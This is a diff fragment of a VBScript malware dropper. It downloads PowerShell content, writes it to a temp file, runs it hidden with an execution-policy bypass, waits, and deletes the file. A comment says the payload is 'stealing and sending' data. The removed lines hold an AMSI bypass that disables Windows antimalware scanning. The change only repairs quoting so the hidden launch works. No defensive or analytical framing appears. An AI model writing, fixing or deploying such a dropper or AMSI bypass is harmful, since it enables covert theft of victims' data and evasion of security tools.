@@ -24,16 +24,11 @@ If xh.Status = 200 Then
     f.Write ps1Content
     f.Close
 
-    ' 3. Create an AMSI bypass string in PowerShell
-    Dim amsi : amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
-
-    ' 4. Run PowerShell with the AMSI bypass, then execute the script
-    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command """ & amsi & " & """ & tempPs1 & """"
-    
-    ' 5. Spawn and Wait (True flag waits for the script to finish stealing and sending)
+    ' 3. Run PowerShell and WAIT (True) - FIXED QUOTES
+    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
     sh.Run finalCmd, 0, True
     
-    ' 6. Cleanup
+    ' 4. Cleanup
     fso.DeleteFile tempPs1, True
 End If
 
